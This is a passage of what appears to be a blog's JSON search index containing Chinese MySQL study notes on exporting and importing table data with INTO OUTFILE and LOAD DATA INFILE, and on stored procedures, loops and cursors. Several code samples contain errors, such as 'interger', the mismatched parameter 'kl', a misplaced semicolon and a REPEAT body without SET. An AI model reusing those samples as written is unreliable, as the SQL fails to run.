class=\"keyword\">BY</span> <span class=\"string\">'string'</span>]</span><br><span class=\"line\">\t[[<span class=\"keyword\">OPTIONALLY</span>] <span class=\"keyword\">ENCLOSED</span> <span class=\"keyword\">by</span> <span class=\"string\">'char'</span>]</span><br><span class=\"line\">\t[<span class=\"keyword\">ESCAPED</span> <span class=\"keyword\">BY</span> <span class=\"string\">'char'</span>]</span><br><span class=\"line\">]</span><br><span class=\"line\">[<span class=\"keyword\">LINES</span> <span class=\"keyword\">TERMINATED</span> <span class=\"keyword\">BY</span> <span class=\"string\">'string'</span>]</span><br><span class=\"line\">|<span class=\"keyword\">DUMPFILE</span> <span class=\"string\">'文件名2'</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>说明：</strong></p>\n<blockquote>\n<p>(1)这个语句将select语句选中的行写入到一个文件中，如果要指定特定位置，则要在文件名前加上具体的路径，空值会以’\\N’表示<br>(2)FIELDS子句：如果指定了FIELDS子句，那么后面的三个至少要指定一个。<br>1、TERMINATED BY 用来指定字段值之间的的符号，例如，TERMINATED BY <font face=\"Futura\">‘,’</font>，则指定了逗号作为分隔标志，<br>2、ENCOLSED BY 子句用来指定包裹文件中字符值的符号，例如ENCLOSED BY <font face=\"Futura\">‘“‘</font>，表示文件中字符值放在双引号之间，若加上OPTIONALLY表示所有的值都放在双引号之间。<br>3、ESCAPED BY 子句用来指定转义字符，例如，<font face=\"Futura\">“ESCAPED BY ‘*‘”</font> 将<font face=\"Futura\">“*”</font>指定为转义字符，取代<font face=\"Futura\">“\\”</font>，如空格将表示为<font face=\"Futura\">“*N”</font>。<br>(3)LINES子句：在LINES子句中使用TERMINATED BY 指定一行结束的标志，比如“LINES TERMINATED BY ‘?’”表示一行以“?”作为结束标志。<br>如果FIELDS和LINES子句都不指定，则默认使用以下子句。<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">FIELDS TERMINATED BY '\\t' ENCLOSED BY '' ESCAPED BY '\\\\'</span><br><span class=\"line\">LINES TERMINATED BY '\\n'</span><br></pre></td></tr></table></figure><br>如果使用DUMPFILE而不是使用OUTFILE，所导出文件中的所有行都彼此紧挨着放置，值和行之间没有任何标记，，形成了一个长长的值。</p>\n</blockquote>\n<p><strong>注意：</strong>使用上述语句导出的只是数据的内容，不包括表的结构。</p>\n<h3 id=\"2、导入表数据\"><a href=\"#2、导入表数据\" class=\"headerlink\" title=\"2、导入表数据\"></a><strong>2、导入表数据</strong></h3><p>该语句可以将OUTFILE语句导入文件中的数据导入到数据库中。<br>LOAD DATA …INFILE格式：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">LOAD</span> <span class=\"keyword\">DATA</span> [<span class=\"keyword\">LOW_PRIORITY</span>|<span class=\"keyword\">CONCURRENT</span>] [<span class=\"keyword\">LOCAL</span>] <span class=\"keyword\">INFILE</span> <span class=\"string\">'文件名.txt'</span></span><br><span class=\"line\">\t[<span class=\"keyword\">REPLACE</span>|<span class=\"keyword\">IGNORE</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">INTO</span> <span class=\"keyword\">TABLE</span> 表名</span><br><span class=\"line\">\t[<span class=\"keyword\">FIELDS</span></span><br><span class=\"line\">\t\t[<span class=\"keyword\">TERMINATED</span>(终止) <span class=\"keyword\">BY</span> <span class=\"string\">'string'</span>]</span><br><span class=\"line\">\t\t[[<span class=\"keyword\">OPTIONALLY</span>] <span class=\"keyword\">ENCLOSED</span> <span class=\"keyword\">by</span> <span class=\"string\">'char'</span>]</span><br><span class=\"line\">\t\t[<span class=\"keyword\">ESCAPED</span> <span class=\"keyword\">BY</span> <span class=\"string\">'char'</span>]</span><br><span class=\"line\">\t]</span><br><span class=\"line\">\t[<span class=\"keyword\">LINES</span></span><br><span class=\"line\">\t\t[<span class=\"keyword\">STARTING</span> <span class=\"keyword\">BY</span> <span class=\"string\">'string'</span>]</span><br><span class=\"line\">\t\t[<span class=\"keyword\">TERMINATED</span> <span class=\"keyword\">BY</span> <span class=\"string\">'string'</span>]</span><br><span class=\"line\">\t]</span><br><span class=\"line\">\t[<span class=\"keyword\">IGNORE</span> <span class=\"built_in\">number</span> <span class=\"keyword\">LINES</span>]</span><br><span class=\"line\">\t[(列名或用户变量, ...)]</span><br><span class=\"line\">\t[<span class=\"keyword\">SET</span> 列名=表达式, ...]</span><br></pre></td></tr></table></figure>\n<p><strong>说明：</strong></p>\n<blockquote>\n<p>LOW_PRIORITY|CONCURRENT：若指定前者，则延迟语句的执行，若指定后者，则当LOAD DATA正在执行的时候，其他线程可以同时使用该表的数据。<br>LOCAL：若指定LOCAL，则文件会被客户主机上的客户端读取，并被发送到服务器，只是执行速度略慢些。<br>文件名.txt：可以带路径指定文件名。<br>REPLACE|IGNORE：如果指定了REPLACE，则当文件中出现与原有行相同的唯一关键字值时，输入行会替换原有行，如果是IGNORE的话会跳过。<br>STARTING指定每行的前缀，如果行中不包括该前缀，则该行被跳过。<br>IGNORE number LINES：可以用来忽略文件的前几行，例如，可以使用IGNORE 1 LINES来跳过第一行。<br>列名或用户变量：当表中列的顺序与文件中字段值顺序不同时，就必须指定一个列清单。<br>SET子句：SET子句可以在导入数据时修改表中列的值。</p>\n</blockquote>\n<p><strong><font face=\"隶书\">example:</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> student <span class=\"keyword\">where</span> job=<span class=\"string\">'计算机科学与技术'</span></span><br><span class=\"line\">\t<span class=\"keyword\">into</span> <span class=\"keyword\">outfile</span> <span class=\"string\">'D:/myfile.txt'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">fields</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">by</span> <span class=\"string\">','</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">optionally</span> <span class=\"keyword\">enclosed</span> <span class=\"keyword\">by</span> <span class=\"string\">'\"'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">lines</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">by</span> <span class=\"string\">'?'</span>;</span><br></pre></td></tr></table></figure>\n<p>执行此语句产生报错：</p>\n<blockquote>\n<p>ERROR 1290 (HY000): The MySQL server is running with the —secure-file-priv option so it cannot execute this statement</p>\n</blockquote>\n<p>这是因为MySQL对默认导出的目录有权限限制，使用命令<strong><font face=\"隶书\">show variables like ‘%secure_file%’</font></strong> 可以查看此目录，必须导入到指定目录中才可以。</p>\n<blockquote>\n<p>secure_file_priv: G:\\PHPwamp\\wamp64\\tmp\\</p>\n</blockquote>\n<p>修改后的语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> student <span class=\"keyword\">where</span> job=<span class=\"string\">'计算机科学与技术'</span></span><br><span class=\"line\">\t<span class=\"keyword\">into</span> <span class=\"keyword\">outfile</span> <span class=\"string\">'G:/PHPwamp/wamp64/tmp/myfile.txt'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">fields</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">by</span> <span class=\"string\">','</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">optionally</span> <span class=\"keyword\">enclosed</span> <span class=\"keyword\">by</span> <span class=\"string\">'\"'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">lines</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">by</span> <span class=\"string\">'?'</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>注意：</strong>这里的Windows路径名称需要使用正斜杠指定而不是反斜杠。</p>\n<p>导入上述数据到新建的xs表中：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">load</span> <span class=\"keyword\">data</span> <span class=\"keyword\">infile</span> <span class=\"string\">'G:/PHPwamp/wamp64/tmp/myfile.txt'</span></span><br><span class=\"line\">\t<span class=\"keyword\">into</span> <span class=\"keyword\">table</span> xs</span><br><span class=\"line\">\t\t<span class=\"keyword\">fields</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">by</span> <span class=\"string\">','</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">optionally</span> <span class=\"keyword\">enclosed</span> <span class=\"keyword\">by</span> <span class=\"string\">'\"'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">lines</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">by</span> <span class=\"string\">'?'</span>;</span><br></pre></td></tr></table></figure>\n","categories":["资料"],"tags":["SQL"]},{"title":"MySQL学习笔记(六)","url":"/2018/02/09/mysql6/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a><strong>前言</strong></h1><p>MySQL自5.0版本之后，开始支持存储过程、存储函数、触发器和事件。这篇文章就来学习一下这个问题。<br><a id=\"more\"></a></p>\n<h1 id=\"存储过程\"><a href=\"#存储过程\" class=\"headerlink\" title=\"存储过程\"></a><strong>存储过程</strong></h1><p>使用存储过程的优点</p>\n<blockquote>\n<p>(1) 存储过程在服务器端运行，执行速度快<br>(2) 存储过程执行一次后，期执行计划就会存储在告诉缓冲存储器中，在以后的操作中则会直接调用已编译的二进制代码执行，从而提高了系统性能。<br>(3) 确保数据库安全，使用存储过程即可完成所有数据库操作，可以通过编程方式控制上述操作对数据库信息访问的权限。<br>存储过程实质上相当于函数，所以具有函数的优点。</p>\n</blockquote>\n<h2 id=\"创建存储过程\"><a href=\"#创建存储过程\" class=\"headerlink\" title=\"创建存储过程\"></a><strong>创建存储过程</strong></h2><p>创建存储过程命令格式</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">procedure</span> 存储过程名 ( [参数 ...] )</span><br><span class=\"line\">\t[ 特征 ...] 主体</span><br></pre></td></tr></table></figure>\n<h3 id=\"1、存储过程参数\"><a href=\"#1、存储过程参数\" class=\"headerlink\" title=\"1、存储过程参数\"></a>1、存储过程参数</h3><p>参数:<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ in|out|inout ] 参数名 参数类型    <span class=\"comment\"># 输入参数|输出参数|输入/输出参数，相当于input，print等</span></span><br></pre></td></tr></table></figure></p>\n<p>注意：参数的名字不要采用列的名字，否则会引发重名错误。</p>\n<h3 id=\"2、存储过程特征\"><a href=\"#2、存储过程特征\" class=\"headerlink\" title=\"2、存储过程特征\"></a>2、存储过程特征</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tlanguage SQL</span><br><span class=\"line\">| [not] deterministic</span><br><span class=\"line\">| &#123;contains sql|no sql|reads sql data|modifies sql data&#125;</span><br><span class=\"line\">| sql security &#123;definer|invoker&#125;</span><br><span class=\"line\">| <span class=\"keyword\">comment</span> <span class=\"string\">'string'</span></span><br></pre></td></tr></table></figure>\n<p><strong>说明：</strong></p>\n<blockquote>\n<p><em>language SQL：</em>表名编写这个的语言为SQL语言，指定编程语言，目前仅支持SQL语言。故此选项不可指定<br><em>deterministic：</em>对同样的输入参数输出相同的结果，加 <code>not</code> 参数会产生不确定的结果，默认为 <code>not deterministic</code><br><em>contains sql：</em>表示存储过程不包含读或写数据的语句， <code>reads sql data</code> 表示存储过程包含读数据的语句，但不包含写的数据。 <code>modifies sql data</code> 表示存储过程包含写数据的语句。默认的是 <code>contains sql</code>。<br><em>sql security：</em>定义使用该存储过程的用户的许可。 <code>definer</code>创建者， <code>invoker</code>调用者。<br><em>comment ‘string’：</em>对存储过程的描述， <code>string</code>为描述内容。可以使用命令 <code>show create procedure</code> 来显示。</p>\n</blockquote>\n<h3 id=\"3、存储过程主体\"><a href=\"#3、存储过程主体\" class=\"headerlink\" title=\"3、存储过程主体\"></a>3、存储过程主体</h3><p>存储过程主体包含了在过程调用的时候必须执行的语句，这个部分总是以<em>begin</em>开始，以<em>end</em>结束，如果包含多个语句，则以分号作为结束符，当然，如果只有一句语句的话则不必指定<em>begin-end</em>语句。</p>\n<p>服务器处理语句的时候是以分号作为结束符，如果以分号作为每个语句的结束符，那么执行一条语句就会遇到分号则会认为执行结束，这显然无法执行后面的指令，所以需要用”delimiter 结束符”将结束符改为其他符号。</p>\n<p>用存储过程实现删除一个特定学生的信息</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">procedure</span> delete_student(<span class=\"keyword\">in</span> xh <span class=\"built_in\">char</span>(<span class=\"number\">6</span>))</span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> xs <span class=\"keyword\">where</span> 学号=xh;</span><br><span class=\"line\"><span class=\"keyword\">end</span> $$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<h2 id=\"存储过程体\"><a href=\"#存储过程体\" class=\"headerlink\" title=\"存储过程体\"></a><strong>存储过程体</strong></h2><p>在存储过程中可以使用所有的SQL语句类型，也包括变量的定义和赋值。</p>\n<h3 id=\"1、局部变量\"><a href=\"#1、局部变量\" class=\"headerlink\" title=\"1、局部变量\"></a>1、局部变量</h3><p>在存储过程可以声明局部变量，可以用来存储临时结果，如果不赋初值的话则默认为NULL。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> 变量名 ...类型 [默认值]</span><br></pre></td></tr></table></figure>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"keyword\">num</span> <span class=\"built_in\">int</span>(<span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"keyword\">declare</span> str1,str2 <span class=\"built_in\">varchar</span>(<span class=\"number\">6</span>);</span><br></pre></td></tr></table></figure>\n<p>局部变量只可以在begin-end语句块中声明，并且必须在存储过程的开头。声明完后也只能在该b-e块中使用，不能再其它块中使用。当然，也可以创建 <em>用户变量</em> ，只要在前面加@符号，用户变量存在于整个回话之中。</p>\n<h3 id=\"2、使用set语句赋值\"><a href=\"#2、使用set语句赋值\" class=\"headerlink\" title=\"2、使用set语句赋值\"></a>2、使用set语句赋值</h3><p>格式：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> 变量名=表达式 [,变量名=表达式] ...</span><br></pre></td></tr></table></figure></p>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">num</span>=<span class=\"number\">1</span>, str1=<span class=\"string\">'hello'</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3、select…into语句\"><a href=\"#3、select…into语句\" class=\"headerlink\" title=\"3、select…into语句\"></a>3、select…into语句</h3><p>使用这个语句可以把选定的列值直接存储到变量中。因此，返回结果只能有一行。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> 列名[,...] <span class=\"keyword\">into</span> 变量名 [,...] table_expr</span><br></pre></td></tr></table></figure>\n<p><code>table_expr</code>指select语句中的from子句及后面的部分。</p>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<p>例如，在存储过程中，将xs表中的学号为081101的学生姓名和专业名的值分别赋给变量name和project。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> 姓名,专业名 <span class=\"keyword\">into</span> <span class=\"keyword\">name</span>,<span class=\"keyword\">project</span></span><br><span class=\"line\">\t<span class=\"keyword\">from</span> xs;</span><br><span class=\"line\">\twhere 学号='081101';</span><br></pre></td></tr></table></figure>\n<p>注意：该语句只能在存储过程中使用，而且变量名name和project需要在使用之前声明。</p>\n<h3 id=\"4、流程控制语句\"><a href=\"#4、流程控制语句\" class=\"headerlink\" title=\"4、流程控制语句\"></a>4、流程控制语句</h3><p>在MySQL语句中，可以使用过程式语句。</p>\n<h4 id=\"1-if语句\"><a href=\"#1-if语句\" class=\"headerlink\" title=\"1) if语句\"></a>1) if语句</h4><p>格式：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">if 条件 then 语句</span><br><span class=\"line\">[elseif 条件 then 语句] ...</span><br><span class=\"line\">[else 语句]</span><br><span class=\"line\"><span class=\"keyword\">end</span> <span class=\"keyword\">if</span></span><br></pre></td></tr></table></figure>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<p>对于一个数据库，判断两个输入的参数哪一个更大。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">procedure</span> xscj.compar</span><br><span class=\"line\">\t(<span class=\"keyword\">in</span> kl interger,<span class=\"keyword\">in</span> k2 interger,<span class=\"keyword\">out</span> k3 <span class=\"built_in\">char</span>(<span class=\"number\">6</span>))</span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> k1&gt;k2 <span class=\"keyword\">then</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">set</span> k3=<span class=\"string\">'大于'</span>;</span><br><span class=\"line\">\telseif k1=k2 then</span><br><span class=\"line\">\t\t<span class=\"keyword\">set</span> k3=<span class=\"string\">'等于'</span>;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\t<span class=\"keyword\">set</span> k3=<span class=\"string\">'小于'</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">end</span> <span class=\"keyword\">if</span>;</span><br><span class=\"line\"><span class=\"keyword\">end</span>$$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-case语句\"><a href=\"#2-case语句\" class=\"headerlink\" title=\"2) case语句\"></a>2) case语句</h4><p>格式：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">CASE case_value</span><br><span class=\"line\">\tWHEN when_value THEN 语句</span><br><span class=\"line\">\t[WHEN when_value THEN 语句] ...</span><br><span class=\"line\">\t[ELSE 语句]</span><br><span class=\"line\"><span class=\"keyword\">END</span> <span class=\"keyword\">CASE</span></span><br></pre></td></tr></table></figure>\n<p>或者<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">CASE</span><br><span class=\"line\">\tWHEN 条件 THEN 语句</span><br><span class=\"line\">\t[WHEN 条件 THEN 语句] ...</span><br><span class=\"line\">\t[ELSE 语句]</span><br><span class=\"line\"><span class=\"keyword\">END</span> <span class=\"keyword\">CASE</span></span><br></pre></td></tr></table></figure></p>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">procedure</span> xscj.result</span><br><span class=\"line\">\t(<span class=\"keyword\">in</span> <span class=\"keyword\">str</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">4</span>),<span class=\"keyword\">out</span> sex <span class=\"built_in\">varchar</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"keyword\">str</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">when</span> <span class=\"string\">'m'</span> <span class=\"keyword\">then</span> <span class=\"keyword\">set</span> sex=<span class=\"string\">'男'</span>;</span><br><span class=\"line\">\t\twhen 'f' then <span class=\"keyword\">set</span> sex=<span class=\"string\">'女'</span>;</span><br><span class=\"line\">\t\telse <span class=\"keyword\">set</span> sex=<span class=\"string\">'无'</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">end</span> <span class=\"keyword\">case</span>;</span><br><span class=\"line\"><span class=\"keyword\">end</span> $$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">case</span><br><span class=\"line\">\twhen str='m' then <span class=\"keyword\">set</span> sex=<span class=\"string\">'男'</span>;</span><br><span class=\"line\">\twhen str='f' then <span class=\"keyword\">set</span> sex=<span class=\"string\">'女'</span>;</span><br><span class=\"line\">\telse <span class=\"keyword\">set</span> sex=<span class=\"string\">'无'</span>;</span><br><span class=\"line\"><span class=\"keyword\">end</span> <span class=\"keyword\">case</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-循环语句\"><a href=\"#3-循环语句\" class=\"headerlink\" title=\"3) 循环语句\"></a>3) 循环语句</h4><h5 id=\"while语句格式\"><a href=\"#while语句格式\" class=\"headerlink\" title=\"while语句格式\"></a><strong><font face=\"宋体\">while</font>语句格式</strong></h5><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">[begin_label:]</span><br><span class=\"line\">WHILE 条件 <span class=\"keyword\">DO</span></span><br><span class=\"line\">\t语句</span><br><span class=\"line\"><span class=\"keyword\">END</span> <span class=\"keyword\">WHILE</span> [end_label]</span><br></pre></td></tr></table></figure>\n<p>注意：b-e label必须同时出现，并且label必须相同。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">procedure</span> dowhile()</span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">declare</span> v1 <span class=\"built_in\">int</span> <span class=\"keyword\">default</span> <span class=\"number\">5</span>;</span><br><span class=\"line\">\twhile v1&gt;0 do</span><br><span class=\"line\">\t\t<span class=\"keyword\">set</span> v1=v1<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">end</span> <span class=\"keyword\">while</span>;</span><br><span class=\"line\"><span class=\"keyword\">end</span>$$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<h5 id=\"repeat语句格式\"><a href=\"#repeat语句格式\" class=\"headerlink\" title=\"repeat语句格式\"></a><strong><font face=\"宋体\">repeat</font>语句格式</strong></h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[begin_label:]</span><br><span class=\"line\">REPEAT</span><br><span class=\"line\">\t语句</span><br><span class=\"line\">\tUNTIL 条件</span><br><span class=\"line\">END REPEAT [end_label]</span><br></pre></td></tr></table></figure>\n<p><strong><font face=\"隶书\">example</font></strong><br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">repeat</span><br><span class=\"line\">\tv1=v1-1;</span><br><span class=\"line\">\tuntil v1&lt;1;</span><br><span class=\"line\"><span class=\"keyword\">end</span> <span class=\"keyword\">repeat</span>;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"LOOP语句格式\"><a href=\"#LOOP语句格式\" class=\"headerlink\" title=\"LOOP语句格式\"></a><strong><font face=\"隶书\">LOOP</font>语句格式</strong></h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[begin_label:]</span><br><span class=\"line\">LOOP</span><br><span class=\"line\">\t语句</span><br><span class=\"line\">END LOOP [end_label]</span><br></pre></td></tr></table></figure>\n<p><em>loop</em> 允许某特定语句或语句群的重复执行，想要退出的话可以用一个<em>leave</em>语句。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">LEAVE label</span><br></pre></td></tr></table></figure>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">procedure</span> doloop()</span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">set</span> @a=<span class=\"number\">10</span>;</span><br><span class=\"line\">\tlabel:loop</span><br><span class=\"line\">\t\t<span class=\"keyword\">set</span> @a=@a<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\tif @a&lt;0 then</span><br><span class=\"line\">\t\t\tleave label;</span><br><span class=\"line\">\t\t<span class=\"keyword\">end</span> <span class=\"keyword\">if</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">end</span> <span class=\"keyword\">loop</span> label;</span><br><span class=\"line\"><span class=\"keyword\">end</span>$$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<h5 id=\"iterate语句\"><a href=\"#iterate语句\" class=\"headerlink\" title=\"iterate语句\"></a><strong><font face=\"宋体\">iterate</font>语句</strong></h5><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">ITERATE label</span><br></pre></td></tr></table></figure>\n<p>这个语句意为”再次循环”，指重新开始一个循环，与continue的含义类似。</p>\n<h3 id=\"5、处理程序和条件\"><a href=\"#5、处理程序和条件\" class=\"headerlink\" title=\"5、处理程序和条件\"></a>5、处理程序和条件</h3><h3 id=\"6、游标\"><a href=\"#6、游标\" class=\"headerlink\" title=\"6、游标\"></a>6、游标</h3><p>一条select…into语句返回的是带有值的一行，如果想要处理返回的多行数据，则可以使用游标。</p>\n<h4 id=\"1-声明游标\"><a href=\"#1-声明游标\" class=\"headerlink\" title=\"1)声明游标\"></a>1)声明游标</h4><p>语法格式：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DECLARE 游标名 CURSOR FOR select 语句</span><br></pre></td></tr></table></figure><br>注意：select语句不能有into子句</p>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> xs_curl <span class=\"keyword\">cursor</span> <span class=\"keyword\">for</span></span><br><span class=\"line\">\t<span class=\"keyword\">select</span> 学号,姓名,性别,出生日期,总学分</span><br><span class=\"line\">\t\t<span class=\"keyword\">from</span> xs</span><br><span class=\"line\">\t\t<span class=\"keyword\">where</span> 专业名=<span class=\"string\">'计算机'</span>;</span><br></pre></td></tr></table></figure>\n<p>注意：该语句不能单独运行，必须在存储过程或存储函数中运行。</p>\n<h4 id=\"2-打开游标\"><a href=\"#2-打开游标\" class=\"headerlink\" title=\"2)打开游标\"></a>2)打开游标</h4><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">OPEN 游标名</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-读取数据\"><a href=\"#3-读取数据\" class=\"headerlink\" title=\"3)读取数据\"></a>3)读取数据</h4><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">FETCH 游标名 INTO 变量名 ...</span><br></pre></td></tr></table></figure>\n<p><em>fetch</em>语句是将一行数据赋给一些变量，每次已自动读取到下一行，所以变量名数量必须与<em>select</em>语句中的列数相等。</p>\n<h4 id=\"4-关闭游标\"><a href=\"#4-关闭游标\" class=\"headerlink\" title=\"4)关闭游标\"></a>4)关闭游标</h4><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">CLOSE 游标名</span><br></pre></td></tr></table></figure>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">close xs_cur2</span><br></pre></td></tr></table></figure>\n<p>下面是一些示例：</p>\n<p><strong><font face=\"隶书\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">procedure</span> <span class=\"keyword\">compute</span> (<span class=\"keyword\">out</span> <span class=\"built_in\">number</span> <span class=\"built_in\">integer</span>)</span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">declare</span> xh <span class=\"built_in\">char</span>(<span class=\"number\">6</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">declare</span> <span class=\"keyword\">found</span> <span class=\"built_in\">boolean</span> <span class=\"keyword\">default</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">declare</span> number_xs <span class=\"keyword\">cursor</span> <span class=\"keyword\">for</span> </span><br><span class=\"line\">\t\t<span class=\"keyword\">select</span> 学号 <span class=\"keyword\">from</span> xs;</span><br><span class=\"line\">\t<span class=\"keyword\">declare</span> continue <span class=\"keyword\">handler</span> <span class=\"keyword\">for</span> <span class=\"keyword\">not</span> <span class=\"keyword\">found</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">set</span> <span class=\"keyword\">found</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">set</span> <span class=\"built_in\">number</span>=<span class=\"number\">0</span>;</span><br><span class=\"line\">\topen number_xs;</span><br><span class=\"line\">\tfetch number_xs into xh;</span><br><span class=\"line\">\twhile found <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">set</span> <span class=\"built_in\">number</span>=<span class=\"built_in\">number</span>+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tfetch number_xs into xh;</span><br><span class=\"line\">\t<span class=\"keyword\">end</span> <span class=\"keyword\">while</span>;</span><br><span class=\"line\">\tclose number_xs;</span><br><span class=\"line\"><span class=\"keyword\">end</span> $$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<p>在MySQL 5.6以后，创建存储过程必须具有<strong><font face=\"宋体\">CREATE 